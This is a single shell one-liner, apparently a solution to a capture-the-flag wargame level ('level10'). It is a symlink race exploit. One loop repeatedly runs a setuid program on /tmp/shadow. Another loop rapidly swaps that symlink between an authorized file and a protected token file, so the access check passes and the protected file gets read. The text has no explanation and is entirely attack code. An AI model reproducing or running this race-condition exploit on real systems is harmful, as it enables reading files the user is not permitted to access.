(while true; do ~/level10 /tmp/shadow 127.0.0.1 &> /dev/null; done;)& (while true; do ln -fs /tmp/authorize /tmp/shadow; ln -fs ~/token /tmp/shadow; done;)
